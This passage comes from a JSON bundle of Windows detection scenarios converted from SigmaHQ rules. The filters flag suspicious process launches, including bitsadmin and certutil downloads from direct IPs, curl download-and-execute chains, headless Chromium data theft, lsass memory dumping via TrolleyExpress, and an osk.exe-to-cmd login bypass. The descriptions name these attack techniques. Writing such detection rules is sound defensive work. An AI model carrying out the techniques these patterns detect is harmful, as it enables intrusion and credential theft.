'\\\\mshta.exe' || evt.Parsed.Image endsWith '\\\\notepad.exe' || evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe' || evt.Parsed.Image endsWith '\\\\wscript.exe' || evt.Parsed.Image contains '\\\\AppData\\\\Local\\\\' || evt.Parsed.Image contains '\\\\AppData\\\\Roaming\\\\' || evt.Parsed.Image contains ':\\\\Users\\\\Public\\\\' || evt.Parsed.Image contains ':\\\\Temp\\\\' || evt.Parsed.Image contains ':\\\\Windows\\\\Temp\\\\' || evt.Parsed.Image contains ':\\\\PerfLogs\\\\'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1059.005\n   - attack.t1218\n   - attack.t1202\n\n  label: \"Suspicious Child Process Of BgInfo.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious child processes of \"BgInfo.exe\" which could be a sign of potential abuse of the binary to proxy execution via external VBScript\n", "path": "scenarios/sigmahq/proc_creation_win_bginfo_suspicious_child_process.yml", "version": "0.2", "versions": {"0.1": {"digest": "8180482e60657d5e48d08d3605e14bb597a917d5c65cb19846180daf9eb47d9d"}, "0.2": {"digest": "f1cc49466276d26b3362a30b04a47d3884b41c2b8aeb37b8217793acb714df56"}}}, "sigmahq/proc_creation_win_bitsadmin_download_direct_ip": {"content": "type: trigger\nname: sigmahq/proc_creation_win_bitsadmin_download_direct_ip\ndescription: |\n  Detects usage of bitsadmin downloading a file using an URL that contains an IP\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\bitsadmin.exe' || evt.Parsed.OriginalFileName == 'bitsadmin.exe') && (evt.Parsed.CommandLine contains ' /transfer ' || evt.Parsed.CommandLine contains ' /create ' || evt.Parsed.CommandLine contains ' /addfile ') && (evt.Parsed.CommandLine contains '://1' || evt.Parsed.CommandLine contains '://2' || evt.Parsed.CommandLine contains '://3' || evt.Parsed.CommandLine contains '://4' || evt.Parsed.CommandLine contains '://5' || evt.Parsed.CommandLine contains '://6' || evt.Parsed.CommandLine contains '://7' || evt.Parsed.CommandLine contains '://8' || evt.Parsed.CommandLine contains '://9') && not (evt.Parsed.CommandLine contains '://7-'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1197\n   - attack.t1036.003\n\n  label: \"Suspicious Download From Direct IP Via Bitsadmin\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects usage of bitsadmin downloading a file using an URL that contains an IP\n", "path": "scenarios/sigmahq/proc_creation_win_bitsadmin_download_direct_ip.yml", "version": "0.2", "versions": {"0.1": {"digest": "25c8711a510c10449106c8fba6a1b180a6f1c7eea104e752bed12256e693ca0b"}, "0.2": {"digest": "80b45d5c8137615791536fa0ee5e9203521d920be4690259bd8e986794b5cc41"}}}, "sigmahq/proc_creation_win_bitsadmin_download_susp_extensions": {"content": "type: trigger\nname: sigmahq/proc_creation_win_bitsadmin_download_susp_extensions\ndescription: |\n  Detects usage of bitsadmin downloading a file with a suspicious extension\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\bitsadmin.exe' || evt.Parsed.OriginalFileName == 'bitsadmin.exe') && (evt.Parsed.CommandLine contains ' /transfer ' || evt.Parsed.CommandLine contains ' /create ' || evt.Parsed.CommandLine contains ' /addfile ') && (evt.Parsed.CommandLine contains '.7z' || evt.Parsed.CommandLine contains '.asax' || evt.Parsed.CommandLine contains '.ashx' || evt.Parsed.CommandLine contains '.asmx' || evt.Parsed.CommandLine contains '.asp' || evt.Parsed.CommandLine contains '.aspx' || evt.Parsed.CommandLine contains '.bat' || evt.Parsed.CommandLine contains '.cfm' || evt.Parsed.CommandLine contains '.cgi' || evt.Parsed.CommandLine contains '.chm' || evt.Parsed.CommandLine contains '.cmd' || evt.Parsed.CommandLine contains '.dll' || evt.Parsed.CommandLine contains '.gif' || evt.Parsed.CommandLine contains '.jpeg' || evt.Parsed.CommandLine contains '.jpg' || evt.Parsed.CommandLine contains '.jsp' || evt.Parsed.CommandLine contains '.jspx' || evt.Parsed.CommandLine contains '.log' || evt.Parsed.CommandLine contains '.png' || evt.Parsed.CommandLine contains '.ps1' || evt.Parsed.CommandLine contains '.psm1' || evt.Parsed.CommandLine contains '.rar' || evt.Parsed.CommandLine contains '.scf' || evt.Parsed.CommandLine contains '.sct' || evt.Parsed.CommandLine contains '.txt' || evt.Parsed.CommandLine contains '.vbe' || evt.Parsed.CommandLine contains '.vbs' || evt.Parsed.CommandLine contains '.war' || evt.Parsed.CommandLine contains '.wsf' || evt.Parsed.CommandLine contains '.wsh' || evt.Parsed.CommandLine contains '.xll' || evt.Parsed.CommandLine contains '.zip'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1197\n   - attack.t1036.003\n\n  label: \"File With Suspicious Extension Downloaded Via Bitsadmin\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects usage of bitsadmin downloading a file with a suspicious extension\n", "path": "scenarios/sigmahq/proc_creation_win_bitsadmin_download_susp_extensions.yml", "version": "0.2", "versions": {"0.1": {"digest": "dbaf0aa158e0daa2362e33fb91d914facb88b8fa44e034aae41a6b3251b0aa76"}, "0.2": {"digest": "8519c93da3b2e5a4f63eb9a041c513b237d1839dc97460e7b0fdd326fb3636e3"}}}, "sigmahq/proc_creation_win_bitsadmin_download_susp_targetfolder": {"content": "type: trigger\nname: sigmahq/proc_creation_win_bitsadmin_download_susp_targetfolder\ndescription: |\n  Detects usage of bitsadmin downloading a file to a suspicious target folder\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\bitsadmin.exe' || evt.Parsed.OriginalFileName == 'bitsadmin.exe') && (evt.Parsed.CommandLine contains ' /transfer ' || evt.Parsed.CommandLine contains ' /create ' || evt.Parsed.CommandLine contains ' /addfile ') && (evt.Parsed.CommandLine contains ':\\\\Perflogs' || evt.Parsed.CommandLine contains ':\\\\ProgramData\\\\' || evt.Parsed.CommandLine contains ':\\\\Temp\\\\' || evt.Parsed.CommandLine contains ':\\\\Users\\\\Public\\\\' || evt.Parsed.CommandLine contains ':\\\\Windows\\\\' || evt.Parsed.CommandLine contains '\\\\AppData\\\\Local\\\\Temp\\\\' || evt.Parsed.CommandLine contains '\\\\AppData\\\\Roaming\\\\' || evt.Parsed.CommandLine contains '\\\\Desktop\\\\' || evt.Parsed.CommandLine contains '%ProgramData%' || evt.Parsed.CommandLine contains '%public%'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1197\n   - attack.t1036.003\n\n  label: \"File Download Via Bitsadmin To A Suspicious Target Folder\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects usage of bitsadmin downloading a file to a suspicious target folder\n", "path": "scenarios/sigmahq/proc_creation_win_bitsadmin_download_susp_targetfolder.yml", "version": "0.2", "versions": {"0.1": {"digest": "a7a477342e510804e9e2a8d5134814e663c33aedcb4ab6ffcb0b2e2f48db01fc"}, "0.2": {"digest": "d0cd9ada0ec73a1d6c6c783386eb7e1c2071b226e035fdfe39a016437e172c73"}}}, "sigmahq/proc_creation_win_browsers_chromium_headless_debugging": {"content": "type: trigger\nname: sigmahq/proc_creation_win_browsers_chromium_headless_debugging\ndescription: |\n  Detects chromium based browsers starting in headless and debugging mode and pointing to a user profile. This could be a sign of data stealing or remote control\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains '--remote-debugging-' && evt.Parsed.CommandLine contains '--user-data-dir' && evt.Parsed.CommandLine contains '--headless')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1185\n\n  label: \"Potential Data Stealing Via Chromium Headless Debugging\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects chromium based browsers starting in headless and debugging mode and pointing to a user profile. This could be a sign of data stealing or remote control\n", "path": "scenarios/sigmahq/proc_creation_win_browsers_chromium_headless_debugging.yml", "version": "0.2", "versions": {"0.1": {"digest": "89551fb0c713206d23737ed11dd26be06c9914bf832d1cb533c946cb09467bc2"}, "0.2": {"digest": "9d0a3d48e4806bf9de83795caffbf907cc00d47df73f6ac6457bb4a916ec9971"}}}, "sigmahq/proc_creation_win_browsers_chromium_headless_file_download": {"content": "type: trigger\nname: sigmahq/proc_creation_win_browsers_chromium_headless_file_download\ndescription: |\n  Detects execution of chromium based browser in headless mode using the \"dump-dom\" command line to download files\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\brave.exe' || evt.Parsed.Image endsWith '\\\\chrome.exe' || evt.Parsed.Image endsWith '\\\\msedge.exe' || evt.Parsed.Image endsWith '\\\\opera.exe' || evt.Parsed.Image endsWith '\\\\vivaldi.exe') && evt.Parsed.CommandLine contains '--headless' && evt.Parsed.CommandLine contains 'dump-dom' && evt.Parsed.CommandLine contains 'http')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1105\n\n  label: \"File Download with Headless Browser\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects execution of chromium based browser in headless mode using the \"dump-dom\" command line to download files\n", "path": "scenarios/sigmahq/proc_creation_win_browsers_chromium_headless_file_download.yml", "version": "0.2", "versions": {"0.1": {"digest": "13806e8319643b589a6a5774f4ec91f8d2faab8ae7a9f32462393b288c3bf091"}, "0.2": {"digest": "3418f348649320096ff0b92e90a58184f95891ea43003aa8dad920ee1002a604"}}}, "sigmahq/proc_creation_win_browsers_chromium_mockbin_abuse": {"content": "type: trigger\nname: sigmahq/proc_creation_win_browsers_chromium_mockbin_abuse\ndescription: |\n  Detects the execution of a Chromium based browser process with the \"headless\" flag and a URL pointing to the mockbin.org service (which can be used to exfiltrate data).\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\brave.exe' || evt.Parsed.Image endsWith '\\\\chrome.exe' || evt.Parsed.Image endsWith '\\\\msedge.exe' || evt.Parsed.Image endsWith '\\\\opera.exe' || evt.Parsed.Image endsWith '\\\\vivaldi.exe') && evt.Parsed.CommandLine contains '--headless' && (evt.Parsed.CommandLine contains '://run.mocky' || evt.Parsed.CommandLine contains '://mockbin'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n\n  label: \"Chromium Browser Headless Execution To Mockbin Like Site\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of a Chromium based browser process with the \"headless\" flag and a URL pointing to the mockbin.org service (which can be used to exfiltrate data).\n", "path": "scenarios/sigmahq/proc_creation_win_browsers_chromium_mockbin_abuse.yml", "version": "0.2", "versions": {"0.1": {"digest": "0f68f3afcfbe3fd6a106213bf61c3f47d99df7ca13c48eff7c1e1ff099546a8a"}, "0.2": {"digest": "659fa6871d81c3be6b08ee948352730850fa1619fe1e39110d0e1924b9bfa334"}}}, "sigmahq/proc_creation_win_browsers_chromium_susp_load_extension": {"content": "type: trigger\nname: sigmahq/proc_creation_win_browsers_chromium_susp_load_extension\ndescription: |\n  Detects a suspicious process spawning a Chromium based browser process with the 'load-extension' flag to start an instance with a custom extension\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.ParentImage endsWith '\\\\cmd.exe' || evt.Parsed.ParentImage endsWith '\\\\cscript.exe' || evt.Parsed.ParentImage endsWith '\\\\mshta.exe' || evt.Parsed.ParentImage endsWith '\\\\powershell.exe' || evt.Parsed.ParentImage endsWith '\\\\pwsh.exe' || evt.Parsed.ParentImage endsWith '\\\\regsvr32.exe' || evt.Parsed.ParentImage endsWith '\\\\rundll32.exe' || evt.Parsed.ParentImage endsWith '\\\\wscript.exe') && (evt.Parsed.Image endsWith '\\\\brave.exe' || evt.Parsed.Image endsWith '\\\\chrome.exe' || evt.Parsed.Image endsWith '\\\\msedge.exe' || evt.Parsed.Image endsWith '\\\\opera.exe' || evt.Parsed.Image endsWith '\\\\vivaldi.exe') && evt.Parsed.CommandLine contains '--load-extension=')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1176\n\n  label: \"Suspicious Chromium Browser Instance Executed With Custom Extension\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects a suspicious process spawning a Chromium based browser process with the 'load-extension' flag to start an instance with a custom extension\n", "path": "scenarios/sigmahq/proc_creation_win_browsers_chromium_susp_load_extension.yml", "version": "0.2", "versions": {"0.1": {"digest": "125d2c9af40f0d7439e7fc988fea789c235e226925ac5c6d72ff398fd7740f8a"}, "0.2": {"digest": "1250a08dabba02f1a4f3f73ff8688a5dde3ab566aa17e98c19874f5c4eca21fb"}}}, "sigmahq/proc_creation_win_browsers_tor_execution": {"content": "type: trigger\nname: sigmahq/proc_creation_win_browsers_tor_execution\ndescription: |\n  Detects the use of Tor or Tor-Browser to connect to onion routing networks\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\tor.exe' || evt.Parsed.Image endsWith '\\\\Tor Browser\\\\Browser\\\\firefox.exe')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1090.003\n\n  label: \"Tor Client/Browser Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the use of Tor or Tor-Browser to connect to onion routing networks\n", "path": "scenarios/sigmahq/proc_creation_win_browsers_tor_execution.yml", "version": "0.2", "versions": {"0.1": {"digest": "5f3d2876035af178f0071e7808f5f6cf18eeab5fafd9d457240a5c7951feba33"}, "0.2": {"digest": "10c5c8cd4f27e989899c713f920d86e2a9403376eb8c637a05638e30d57b75cd"}}}, "sigmahq/proc_creation_win_calc_uncommon_exec": {"content": "type: trigger\nname: sigmahq/proc_creation_win_calc_uncommon_exec\ndescription: |\n  Detects suspicious use of 'calc.exe' with command line parameters or in a suspicious directory, which is likely caused by some PoC or detection evasion. \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains '\\\\calc.exe ' || evt.Parsed.Image endsWith '\\\\calc.exe' && not (evt.Parsed.Image contains ':\\\\Windows\\\\System32\\\\' || evt.Parsed.Image contains ':\\\\Windows\\\\SysWOW64\\\\' || evt.Parsed.Image contains ':\\\\Windows\\\\WinSxS\\\\'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1036\n\n  label: \"Suspicious Calculator Usage\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious use of 'calc.exe' with command line parameters or in a suspicious directory, which is likely caused by some PoC or detection evasion. \n", "path": "scenarios/sigmahq/proc_creation_win_calc_uncommon_exec.yml", "version": "0.2", "versions": {"0.1": {"digest": "e2876b86e4832cc79e826e2d37172b61079685d3443402730614f4e4382dac10"}, "0.2": {"digest": "92fa1c33eda967225efe1e8b96070de7bc92ac4486dfb16f70b80ec2836e022a"}}}, "sigmahq/proc_creation_win_certoc_download_direct_ip": {"content": "type: trigger\nname: sigmahq/proc_creation_win_certoc_download_direct_ip\ndescription: |\n  Detects when a user downloads a file from an IP based URL using CertOC.exe\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\certoc.exe' || evt.Parsed.OriginalFileName == 'CertOC.exe') && evt.Parsed.CommandLine matches '://[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.[0-9]{1,3}' && evt.Parsed.CommandLine contains '-GetCACAPS')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1105\n\n  label: \"File Download From IP Based URL Via CertOC.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects when a user downloads a file from an IP based URL using CertOC.exe\n", "path": "scenarios/sigmahq/proc_creation_win_certoc_download_direct_ip.yml", "version": "0.2", "versions": {"0.1": {"digest": "2733e833c2341ae5a537367250a533663baa41f9bd08e5536990c3e1edf0c29f"}, "0.2": {"digest": "d131ce021bc415ee1b0e1620e31650fb1e5bd245a341a2db4f4a34df0a910fd2"}}}, "sigmahq/proc_creation_win_certoc_load_dll_susp_locations": {"content": "type: trigger\nname: sigmahq/proc_creation_win_certoc_load_dll_susp_locations\ndescription: |\n  Detects when a user installs certificates by using CertOC.exe to load the target DLL file.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\certoc.exe' || evt.Parsed.OriginalFileName == 'CertOC.exe') && (evt.Parsed.CommandLine contains ' -LoadDLL ' || evt.Parsed.CommandLine contains ' /LoadDLL ' || evt.Parsed.CommandLine contains ' \u2013LoadDLL ' || evt.Parsed.CommandLine contains ' \u2014LoadDLL ' || evt.Parsed.CommandLine contains ' \u2015LoadDLL ') && (evt.Parsed.CommandLine contains '\\\\Appdata\\\\Local\\\\Temp\\\\' || evt.Parsed.CommandLine contains '\\\\Desktop\\\\' || evt.Parsed.CommandLine contains '\\\\Downloads\\\\' || evt.Parsed.CommandLine contains '\\\\Users\\\\Public\\\\' || evt.Parsed.CommandLine contains 'C:\\\\Windows\\\\Tasks\\\\' || evt.Parsed.CommandLine contains 'C:\\\\Windows\\\\Temp\\\\'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1218\n\n  label: \"Suspicious DLL Loaded via CertOC.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects when a user installs certificates by using CertOC.exe to load the target DLL file.\n", "path": "scenarios/sigmahq/proc_creation_win_certoc_load_dll_susp_locations.yml", "version": "0.2", "versions": {"0.1": {"digest": "156bb2c38ac379d2b39402aa5ca5564c1b953fa0a6340f89cc72bb1343bdcc36"}, "0.2": {"digest": "3673bbce95a738702199844a6279d53f700fbe028f7ea45c517bfcd70db3f3e6"}}}, "sigmahq/proc_creation_win_certutil_download_direct_ip": {"content": "type: trigger\nname: sigmahq/proc_creation_win_certutil_download_direct_ip\ndescription: |\n  Detects the execution of certutil with certain flags that allow the utility to download files from direct IPs.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\certutil.exe' || evt.Parsed.OriginalFileName == 'CertUtil.exe') && (evt.Parsed.CommandLine contains 'urlcache ' || evt.Parsed.CommandLine contains 'verifyctl ') && (evt.Parsed.CommandLine contains '://1' || evt.Parsed.CommandLine contains '://2' || evt.Parsed.CommandLine contains '://3' || evt.Parsed.CommandLine contains '://4' || evt.Parsed.CommandLine contains '://5' || evt.Parsed.CommandLine contains '://6' || evt.Parsed.CommandLine contains '://7' || evt.Parsed.CommandLine contains '://8' || evt.Parsed.CommandLine contains '://9') && not (evt.Parsed.CommandLine contains '://7-'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1027\n\n  label: \"Suspicious File Downloaded From Direct IP Via Certutil.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of certutil with certain flags that allow the utility to download files from direct IPs.\n", "path": "scenarios/sigmahq/proc_creation_win_certutil_download_direct_ip.yml", "version": "0.2", "versions": {"0.1": {"digest": "f3b433636c733a707546e72aa5a467cf6c74b4f64e89aaf7711afce1dff1dabc"}, "0.2": {"digest": "410bcc5d46b3064c8499ed09ad03ce44dc213ce55b505559bc80735fd151a5da"}}}, "sigmahq/proc_creation_win_certutil_ntlm_coercion": {"content": "type: trigger\nname: sigmahq/proc_creation_win_certutil_ntlm_coercion\ndescription: |\n  Detects possible NTLM coercion via certutil using the 'syncwithWU' flag\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\certutil.exe' || evt.Parsed.OriginalFileName == 'CertUtil.exe') && evt.Parsed.CommandLine contains ' -syncwithWU ' && evt.Parsed.CommandLine contains ' \\\\\\\\')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1218\n\n  label: \"Potential NTLM Coercion Via Certutil.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects possible NTLM coercion via certutil using the 'syncwithWU' flag\n", "path": "scenarios/sigmahq/proc_creation_win_certutil_ntlm_coercion.yml", "version": "0.2", "versions": {"0.1": {"digest": "6ce973b218c3179eda8f86fa7b8e6b005af0c62c7e97d32677a1eb888d9acf5d"}, "0.2": {"digest": "34f1008ffb3dddbbc14292aa5256c3825dd68d74d8fdd682193e2bf130e96f61"}}}, "sigmahq/proc_creation_win_citrix_trolleyexpress_procdump": {"content": "type: trigger\nname: sigmahq/proc_creation_win_citrix_trolleyexpress_procdump\ndescription: |\n  Detects a possible process memory dump that uses the white-listed Citrix TrolleyExpress.exe filename as a way to dump the lsass process memory\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains '\\\\TrolleyExpress 7' || evt.Parsed.CommandLine contains '\\\\TrolleyExpress 8' || evt.Parsed.CommandLine contains '\\\\TrolleyExpress 9' || evt.Parsed.CommandLine contains '\\\\TrolleyExpress.exe 7' || evt.Parsed.CommandLine contains '\\\\TrolleyExpress.exe 8' || evt.Parsed.CommandLine contains '\\\\TrolleyExpress.exe 9' || evt.Parsed.CommandLine contains '\\\\TrolleyExpress.exe -ma ' || evt.Parsed.Image endsWith '\\\\TrolleyExpress.exe' && not (evt.Parsed.OriginalFileName contains 'CtxInstall' || evt.Parsed.OriginalFileName == ''))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1218.011\n   - attack.t1003.001\n\n  label: \"Process Access via TrolleyExpress Exclusion\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects a possible process memory dump that uses the white-listed Citrix TrolleyExpress.exe filename as a way to dump the lsass process memory\n", "path": "scenarios/sigmahq/proc_creation_win_citrix_trolleyexpress_procdump.yml", "version": "0.2", "versions": {"0.1": {"digest": "e965e9dc0d6c271972e495024ca56c53bd40dd4832d94330410600e69600f16d"}, "0.2": {"digest": "4ab04da797b54b9a94cf825eb057a900440f57ef341804a61aa1fe46bf2bc346"}}}, "sigmahq/proc_creation_win_cmd_assoc_tamper_exe_file_association": {"content": "type: trigger\nname: sigmahq/proc_creation_win_cmd_assoc_tamper_exe_file_association\ndescription: |\n  Detects when a program changes the default file association of any extension to an executable. When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using the built-in assoc utility. Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened. \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\cmd.exe' || evt.Parsed.OriginalFileName == 'Cmd.Exe') && evt.Parsed.CommandLine contains 'assoc ' && evt.Parsed.CommandLine contains 'exefile' && not (evt.Parsed.CommandLine contains '.exe=exefile'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1546.001\n\n  label: \"Change Default File Association To Executable Via Assoc\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects when a program changes the default file association of any extension to an executable. When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using the built-in assoc utility. Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened. \n", "path": "scenarios/sigmahq/proc_creation_win_cmd_assoc_tamper_exe_file_association.yml", "version": "0.2", "versions": {"0.1": {"digest": "bd839ff80d7b70c604f01db356cd412f8c7ddd0e9ffecdbead73852b43f3745b"}, "0.2": {"digest": "e488442b1846dc46d021cda09c573ffd235bba11d7de1c91e465e38c7bd79139"}}}, "sigmahq/proc_creation_win_cmd_copy_dmp_from_share": {"content": "type: trigger\nname: sigmahq/proc_creation_win_cmd_copy_dmp_from_share\ndescription: |\n  Detects usage of the copy builtin cmd command to copy files with the \".dmp\"/\".dump\" extension from a remote share\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\cmd.exe' || evt.Parsed.OriginalFileName == 'Cmd.Exe') && evt.Parsed.CommandLine contains 'copy ' && evt.Parsed.CommandLine contains ' \\\\\\\\' && (evt.Parsed.CommandLine contains '.dmp' || evt.Parsed.CommandLine contains '.dump' || evt.Parsed.CommandLine contains '.hdmp'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n\n  label: \"Copy .DMP/.DUMP Files From Remote Share Via Cmd.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects usage of the copy builtin cmd command to copy files with the \".dmp\"/\".dump\" extension from a remote share\n", "path": "scenarios/sigmahq/proc_creation_win_cmd_copy_dmp_from_share.yml", "version": "0.2", "versions": {"0.1": {"digest": "0df9ef314aeb3acbf34600068e84efa58d9d01f0770648c820da6b83bee3673f"}, "0.2": {"digest": "772aa24e18f0cc7849b8b27c595a17b941ff61a87527b690bdab19ed139e6605"}}}, "sigmahq/proc_creation_win_cmd_curl_download_exec_combo": {"content": "type: trigger\nname: sigmahq/proc_creation_win_cmd_curl_download_exec_combo\ndescription: |\n  Adversaries can use curl to download payloads remotely and execute them. Curl is included by default in Windows 10 build 17063 and later.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.CommandLine contains ' -c ' || evt.Parsed.CommandLine contains ' /c ' || evt.Parsed.CommandLine contains ' \u2013c ' || evt.Parsed.CommandLine contains ' \u2014c ' || evt.Parsed.CommandLine contains ' \u2015c ') && evt.Parsed.CommandLine contains 'curl ' && evt.Parsed.CommandLine contains 'http' && evt.Parsed.CommandLine contains '-o' && evt.Parsed.CommandLine contains '&')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1218\n   - attack.t1105\n\n  label: \"Curl Download And Execute Combination\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Adversaries can use curl to download payloads remotely and execute them. Curl is included by default in Windows 10 build 17063 and later.\n", "path": "scenarios/sigmahq/proc_creation_win_cmd_curl_download_exec_combo.yml", "version": "0.2", "versions": {"0.1": {"digest": "8c1de35c7859c69322215af3b6d3e92e4d3e08611fd4aab568e685a2c32dd344"}, "0.2": {"digest": "06058015bd47bcaaa9910b438cf223d96c8dceb377caa3eb86a5d72951a18a8c"}}}, "sigmahq/proc_creation_win_cmd_mklink_osk_cmd": {"content": "type: trigger\nname: sigmahq/proc_creation_win_cmd_mklink_osk_cmd\ndescription: |\n  Detects the creation of a symbolic link between \"cmd.exe\" and the accessibility on-screen keyboard binary (osk.exe) using \"mklink\". This technique provides an elevated command prompt to the user from the login screen without the need to log in.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\cmd.exe' || evt.Parsed.OriginalFileName == 'Cmd.Exe') && evt.Parsed.CommandLine contains 'mklink' && evt.Parsed.CommandLine contains '\\\\osk.exe' && evt.Parsed.CommandLine contains '\\\\cmd.exe')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  